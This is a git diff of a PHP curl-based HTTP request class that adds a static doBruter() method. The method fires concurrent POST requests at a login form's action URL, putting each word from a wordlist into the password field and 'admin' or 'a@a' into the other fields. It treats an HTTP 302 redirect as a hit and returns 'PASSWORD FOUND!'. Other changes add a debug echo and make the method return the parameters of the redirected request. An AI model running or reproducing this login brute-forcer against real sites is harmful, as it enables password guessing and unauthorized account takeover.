@@ -1,4 +1,19 @@
 <?php
+/**
+ * A php library to make HTTP Requests using curl
+ * Website: https://github.com/mr-medi
+ *
+ * <pre>
+ * echo phpUri::parse('https://www.google.com/')->join('foo');
+ * //==> https://www.google.com/foo
+ * </pre>
+ *
+ * Licensed under The MIT License
+ * Redistributions of files must retain the above copyright notice.
+ *
+ * @author Mr.medi
+ * @version 1.0
+ */
 class Request
 {
     private $urls;
@@ -95,12 +110,14 @@ class Request
             foreach ($urls[$i]['params'] as $p)
                 $params .= $p['name'].'='.$p['value'].'&';
             $params = rtrim($params, '&');
+
             $ch = curl_init();
             $options[CURLOPT_URL] = $url;
             $options[CURLOPT_POSTFIELDS] = $params;
             curl_setopt_array($ch,$options);
             curl_multi_add_handle($master, $ch);
         }
+        $index = 0;
         do
         {
           while(($execrun = curl_multi_exec($master, $running)) == CURLM_CALL_MULTI_PERFORM);
@@ -111,16 +128,20 @@ class Request
           {
               $info = curl_getinfo($done['handle']);//HEADERS REQUEST
               $output = curl_multi_getcontent($done['handle']);//RESPONSE HTML
+              if($info['http_code'] == 302)
+                $p = $urls[$index]['params'];
               // start a new request (it's important to do this before removing the old one)
               if(isset($urls[$i + 1]))
               {
                   $ch = curl_init();
                   $i++;
+                  $index++;
                   $options[CURLOPT_URL] = $url;
                   $params = "";
                   foreach ($urls[$i]['params'] as $p)
                       $params .= $p['name'].'='.$p['value'].'&';
                   $params = rtrim($params, '&');
+                  echo $params;
                   $options[CURLOPT_POSTFIELDS] = $params;
                   curl_setopt_array($ch,$options);
                   curl_multi_add_handle($master, $ch);
@@ -136,7 +157,7 @@ class Request
           }
         }while ($running);
         curl_multi_close($master);
-        return $dataURLS;
+        return $p;
     }
 
     public function getHeaders($respHeaders)
@@ -161,5 +182,55 @@ class Request
     public function addParam($param , $value)
     {
         $this->params[] = ['param'=>$param, 'value'=>$value];
+    }
+
+    public static function doBruter($words, $params, $action)
+    {
+        $urls = [];
+        foreach($words as $word)
+        {
+            $paramsRequest = [];
+            foreach($params as $param)
+            {
+                $name = $param['name'];
+                $value = $param['value'];
+                $type = $param['type'];
+                //ADDING PARAMS
+                if($value != "")
+                {
+                    $paramsRequest[] = ['name'=>$name,'value'=>$value,'type'=>$type];
+                }
+                else
+                {
+                    if($name == 'mail' || $type == "email" || $name =="email")
+                    {
+                        $paramsRequest[] = ['name'=>$name,'value'=>'a@a','type'=>$type];
+                    }
+                    elseif(strtolower($type) == 'password' || $name == 'password')
+                    {
+                        $paramsRequest[] = ['name'=>$name,'value'=>$word,'type'=>$type];
+                    }
+                    else
+                    {
+                        $paramsRequest[] = ['name'=>$name,'value'=>'admin','type'=>$type];
+                    }
+                }
+            }
+            if($word != "")
+                $urls[] = ['url'=>$action,'params'=>$paramsRequest];
+        }
+
+        $r = new Request([$action]);
+        $responses = $r->doPostRequests($urls);
+        $pass = false;
+        foreach($responses as $response)
+        {
+            if($response['type'] == 'password')
+            {
+                $pass = true;
+                return "PASSWORD FOUND! => ".$response['value'];
+            }
+        }
+        return !$pass ? "Sorry, not found :(":"";
     }
 }
